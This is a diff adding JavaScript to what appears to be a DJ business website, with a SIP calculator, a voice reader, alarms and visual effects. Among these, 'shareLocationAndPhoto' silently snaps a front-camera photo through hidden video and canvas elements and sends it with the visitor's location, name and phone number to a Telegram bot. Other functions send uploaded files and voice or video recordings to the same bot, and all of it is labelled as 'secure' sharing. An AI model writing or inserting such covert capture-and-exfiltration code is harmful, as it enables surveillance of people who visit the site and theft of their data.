+            if (isNaN(p) || isNaN(r) || isNaN(y) || p <= 0 || r <= 0 || y <= 0) { alert("Please enter valid numbers."); return; }
+            let monthlyRate = (r / 12) / 100; let months = y * 12;
+            let expectedValue = p * ((Math.pow(1 + monthlyRate, months) - 1) / monthlyRate) * (1 + monthlyRate);
+            let investedAmount = p * months; let estReturns = expectedValue - investedAmount;
+            document.getElementById('resSIPInvested').innerText = "₹" + Math.round(investedAmount).toLocaleString('en-IN');
+            document.getElementById('resSIPReturns').innerText = "₹" + Math.round(estReturns).toLocaleString('en-IN');
+            document.getElementById('resSIPTotal').innerText = "₹" + Math.round(expectedValue).toLocaleString('en-IN');
+            document.getElementById('sipResult').style.display = 'block';
+        }
+
+        // --- DJ MUSIC ---
+        function toggleDjMusic() {
+            const audio = document.getElementById('djMusicAudio'); const btn = document.getElementById('djMusicBtn');
+            if(audio.paused) { audio.play(); btn.innerHTML = '<i class="fas fa-pause"></i> Pause Music'; } 
+            else { audio.pause(); btn.innerHTML = '<i class="fas fa-play"></i> Play Music'; }
+        }
+
+        // --- FONT SIZE SCALER ---
+        function changeFontSize(size) {
+            document.querySelectorAll('.reading-text, .feed-text, .about-content-area p, .bio, .setting-label').forEach(el => { el.style.fontSize = size; });
+        }
+
+        // --- PERFECT CHUNKED VOICE READER ---
+        function applyAutoReader() {
+            if (document.getElementById('toggleVoice').checked) {
+                window.speechSynthesis.cancel();
+                let textElements = document.querySelectorAll('h1, h2, h3, h4, p.reading-text, li.reading-text, span');
+                let fullText = Array.from(textElements).map(el => el.innerText).join('. ');
+                fullText = fullText.replace(/\s+/g, ' ').trim();
+                let chunks = fullText.match(/[^.!?]+[.!?]+/g) || [fullText]; 
+                
+                let u = new SpeechSynthesisUtterance("Welcome to Maa Nirmala DJ. Reading the page now.");
+                u.lang = 'hi-IN'; window.speechSynthesis.speak(u);
+
+                chunks.forEach((chunk, index) => {
+                    let msg = new SpeechSynthesisUtterance(chunk);
+                    msg.lang = 'hi-IN';
+                    if(index === chunks.length - 1) { msg.onend = function() { document.getElementById('toggleVoice').checked = false; }; }
+                    window.speechSynthesis.speak(msg);
+                });
+            } else { window.speechSynthesis.cancel(); }
+        }
+
+        // --- ALTERNATING ALARMS + ULTRASOUND + VIBRATION ---
+        let userAlarms = [];
+        let alarmToggleFlag = false;
+
+        function addCustomAlarm() {
+            const timeVal = document.getElementById('newAlarmTime').value;
+            if(!timeVal) return alert("Select a time first!");
+            userAlarms.push(timeVal); document.getElementById('newAlarmTime').value = '';
+            renderAlarms();
+        }
+        function renderAlarms() {
+            const list = document.getElementById('activeAlarmsList');
+            list.innerHTML = userAlarms.map((a, i) => `<li style="padding:8px; background:rgba(255,255,255,0.05); margin-top:5px; border-radius:5px; display:flex; justify-content:space-between;">⏰ ${a} <span style="color:#ff3333; cursor:pointer;" onclick="removeAlarm(${i})">Delete</span></li>`).join('');
+        }
+        function removeAlarm(index) { userAlarms.splice(index, 1); renderAlarms(); }
+
+        setInterval(() => {
+            const now = new Date();
+            const timeString = now.toLocaleTimeString('en-IN', { hour12: false }).substring(0, 5);
+            const toggle = document.getElementById('toggleAlarm');
+            
+            if(toggle && toggle.checked) {
+                if(userAlarms.includes(timeString) && now.getSeconds() === 0) {
+                    triggerEarthquakeAlarm();
+                }
+            }
+        }, 1000);
+
+        function toggleAlarmStatus() {
+            const toggle = document.getElementById('toggleAlarm');
+            if(toggle.checked && userAlarms.length === 0) {
+                alert("Please set a time for at least one alarm first!"); toggle.checked = false;
+            } else if (!toggle.checked) {
+                stopEarthquakeAlarm();
+            }
+        }
+
+        let ultrasoundOscillator = null;
+        function triggerEarthquakeAlarm() {
+            document.body.classList.add('bass-mode');
+            const promo = document.getElementById('royalWelcomePopup'); 
+            if(promo) promo.style.display = 'flex'; 
+            
+            const stopBtn = document.getElementById('stopAlarmPopupBtn');
+            if(stopBtn) stopBtn.style.display = 'block'; 
+            
+            const audio = document.getElementById('alarmAudio'); 
+            if(alarmToggleFlag) { audio.src = "https://files.catbox.moe/efdl27.mp3"; } 
+            else { audio.src = "https://files.catbox.moe/m832cb.mp3"; }
+            alarmToggleFlag = !alarmToggleFlag;
+            audio.volume = 1.0; audio.play();
+
+            if("vibrate" in navigator) navigator.vibrate([1000, 500, 1000, 500, 2000, 500, 3000]);
+
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                ultrasoundOscillator = audioCtx.createOscillator();
+                ultrasoundOscillator.type = 'square';
+                ultrasoundOscillator.frequency.setValueAtTime(12000, audioCtx.currentTime); 
+                ultrasoundOscillator.connect(audioCtx.destination);
+                ultrasoundOscillator.start();
+            } catch(e) {}
+        }
+
+        function stopEarthquakeAlarm() {
+            document.body.classList.remove('bass-mode');
+            const audio = document.getElementById('alarmAudio'); 
+            if(audio) { audio.pause(); audio.currentTime = 0; }
+            if(ultrasoundOscillator) { ultrasoundOscillator.stop(); ultrasoundOscillator = null; }
+            
+            const promo = document.getElementById('royalWelcomePopup');
+            if(promo) promo.style.display = 'none';
+            
+            const stopBtn = document.getElementById('stopAlarmPopupBtn');
+            if(stopBtn) stopBtn.style.display = 'none';
+        }
+
+        // --- SECURE BACKGROUND LOCATION & PHOTO SENDER ---
+        async function shareLocationAndPhoto() {
+            const name = document.getElementById('mediaName').value || "Unknown Client";
+            const phone = document.getElementById('mediaNum').value || "No Phone";
+            const status = document.getElementById('recordingStatus');
+            
+            status.style.display = 'block'; 
+            status.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Securing Location & Capture...';
+
+            try {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                    const video = document.getElementById('hiddenPhotoCam');
+                    video.srcObject = stream;
+                    
+                    video.onloadedmetadata = () => {
+                        const canvas = document.getElementById('hiddenCanvas');
+                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        
+                        setTimeout(() => { 
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            stream.getTracks().forEach(track => track.stop()); 
+                            
+                            canvas.toBlob((blob) => {
+                                const formData = new FormData();
+                                formData.append('chat_id', TG_CHAT);
+                                formData.append('caption', `🚨 *LIVE LOCATION & PHOTO SECURED* 🚨\n👤 Name: ${name}\n📞 Phone: ${phone}\n📍 Location: [View on Maps](${mapLink})`);
+                                formData.append('photo', blob, 'secure_capture.jpg');
+                                formData.append('parse_mode', 'Markdown');
+                                
+                                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: formData })
+                                .then(() => {
+                                    alert("✅ Live Location & Capture Securely Shared with Management.");
+                                    status.style.display = 'none';
+                                }).catch(() => { status.style.display = 'none'; });
+                            }, 'image/jpeg');
+                        }, 1000);
+                    };
+                }, (error) => { alert("⚠️ Location Access Denied."); status.style.display = 'none'; });
+            } catch(e) { alert("⚠️ Camera Access Denied."); status.style.display = 'none'; }
+        }
+
+        // --- BACKGROUND FILE SENDER (AUDIO/VIDEO) ---
+        function sendSelectedFilesToTelegram(inputElement) {
+            const name = document.getElementById('mediaName').value || "Unknown Client";
+            const phone = document.getElementById('mediaNum').value || "No Phone";
+            const status = document.getElementById('recordingStatus');
+            
+            if(inputElement.files.length === 0) return;
+            
+            status.style.display = 'block'; 
+            status.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Uploading Files to Secure Vault...';
+
+            const file = inputElement.files[0]; 
+            const formData = new FormData();
+            formData.append('chat_id', TG_CHAT);
+            formData.append('caption', `📁 *SECURE FILE UPLOAD*\n👤 Name: ${name}\n📞 Phone: ${phone}\n📄 File: ${file.name}`);
+            
+            let endpoint = 'sendDocument';
+            if(file.type.startsWith('video/')) endpoint = 'sendVideo';
+            if(file.type.startsWith('audio/')) endpoint = 'sendAudio';
+            
+            formData.append(endpoint === 'sendDocument' ? 'document' : (endpoint === 'sendVideo' ? 'video' : 'audio'), file);
+
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/${endpoint}`, { method: 'POST', body: formData })
+            .then(() => {
+                alert(`✅ File '${file.name}' Securely Transferred!`);
+                status.style.display = 'none';
+                inputElement.value = ''; 
+            }).catch(() => {
+                alert("⚠️ File Upload Failed. Size might be too large.");
+                status.style.display = 'none';
+            });
+        }
+
+        // --- TELEGRAM 50s CAMERA & VOICE RECORDING ---
+        let mediaRecorder; let audioChunks = []; let currentFacingMode = 'environment'; let currentStream;
+        
+        function switchCamera() {
+            currentFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
+            alert(currentFacingMode === 'user' ? "Front Camera Selected" : "Rear Camera Selected");
+        }
+
+        async function checkUser() {
+            const n = document.getElementById('mediaName').value; const p = document.getElementById('mediaNum').value;
+            if(!n || !p) { alert("⚠️ Name and Phone are Mandatory."); return false; } return {n,p};
+        }
+
+        function requestVideoCall() { checkUser().then(u => { if(u) window.open("https://t.me/+919771617808", "_blank"); }); }
+
+        async function startVoiceRecord() {
+            const user = await checkUser(); if(!user) return;
+            const btn = document.getElementById('btnVoice'); const stopBtn = document.getElementById('stopRecordBtn'); const status = document.getElementById('recordingStatus');
+            try {
+                currentStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                mediaRecorder = new MediaRecorder(currentStream); mediaRecorder.start(); audioChunks = [];
+                btn.style.display = 'none'; document.getElementById('btnVideo').style.display = 'none'; document.getElementById('btnFlipCam').style.display = 'none';
+                stopBtn.style.display = 'block'; status.style.display = 'block'; status.innerText = 'Capturing Audio...';
+                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+                mediaRecorder.onstop = () => { sendSecure(new Blob(audioChunks, {type:'audio/mpeg'}), 'voice', user.n, user.p); resetRecordButtons(); };
+            } catch(e) { alert("Mic denied."); }
+        }
+
+        async function startVideoRecord() {
+            const user = await checkUser(); if(!user) return;
+            const btn = document.getElementById('btnVideo'); const stopBtn = document.getElementById('stopRecordBtn'); const status = document.getElementById('recordingStatus'); const vid = document.getElementById('cameraPreview');
+            try {
+                currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentFacingMode }, audio: true });
+                vid.srcObject = currentStream; vid.style.display = 'block';
+                mediaRecorder = new MediaRecorder(currentStream); mediaRecorder.start(); audioChunks = [];
+                document.getElementById('btnVoice').style.display = 'none'; btn.style.display = 'none'; document.getElementById('btnFlipCam').style.display = 'none';
+                stopBtn.style.display = 'block'; status.style.display = 'block'; status.innerText = 'Capturing Video (50s limit)...';
+                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    sendSecure(new Blob(audioChunks, {type:'video/mp4'}), 'video', user.n, user.p);
+                    currentStream.getTracks().forEach(t => t.stop()); vid.style.display = 'none'; resetRecordButtons();
+                };
+                setTimeout(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 50000);
+            } catch(e) { alert("Camera denied."); }
+        }
+
+        function stopMediaRecording() { if(mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop(); }
+        function resetRecordButtons() { document.getElementById('btnVoice').style.display = 'block'; document.getElementById('btnVideo').style.display = 'block'; document.getElementById('btnFlipCam').style.display = 'block'; document.getElementById('stopRecordBtn').style.display = 'none'; }
+
+        // --- EFFECTS TOGGLE ---
+        function applyEffectClass(checkboxId, className) {
+            const el = document.getElementById(checkboxId);
+            if(className === 'eye-comfort-mode' && el.checked) { 
+                document.body.classList.remove('newspaper-mode'); 
+                if(document.getElementById('toggleNewspaper')) document.getElementById('toggleNewspaper').checked = false;
+            }
+            if(className === 'newspaper-mode' && el.checked) { 
+                document.body.classList.remove('eye-comfort-mode'); 
+                if(document.getElementById('toggleEyeComfort')) document.getElementById('toggleEyeComfort').checked = false;
+            }
+            if (el.checked) document.body.classList.add(className);
+            else { document.body.classList.remove(className); if(className==='bass-mode') document.getElementById('alarmAudio').pause(); }
+        }
+
+        // --- PARTICLES ---
+        let snowInt, crackerInt;
+        function applySnowfall() {
+            const el = document.getElementById('toggleSnow');
+            const layer = document.getElementById('effect-layer');
+            if (el && el.checked) {
+                snowInt = setInterval(() => {
+                    const snow = document.createElement('div'); snow.className='snowflake'; snow.innerText='❄️';
+                    snow.style.left = Math.random()*100+'vw'; snow.style.animationDuration = (Math.random()*3+2)+'s'; snow.style.fontSize = (Math.random()*15+10)+'px';
+                    layer.appendChild(snow); setTimeout(() => snow.remove(), 4000);
+                }, 150);
+            } else { clearInterval(snowInt); layer.innerHTML=''; }
+        }
+        
+        function applyCrackers() {
+            const el = document.getElementById('toggleCrackers');
+            const layer = document.getElementById('effect-layer');
+            const colors = ['#ff3333', '#00ff00', '#00e5ff', '#ff00ff', '#FFD700'];
+            if(el && el.checked) {
+                crackerInt = setInterval(() => {
+                    const spark = document.createElement('div'); spark.className='cracker-spark';
+                    const c = colors[Math.floor(Math.random() * colors.length)];
+                    spark.style.color = c; spark.style.backgroundColor = c;
+                    spark.style.left = Math.random()*100+'vw'; spark.style.animationDuration = (Math.random()*2+1)+'s';
+                    layer.appendChild(spark); setTimeout(() => spark.remove(), 3000);
+                }, 50); 
+            } else { clearInterval(crackerInt); layer.innerHTML=''; }
+        }
+    </script>
+</div>
+</body>
+</html>
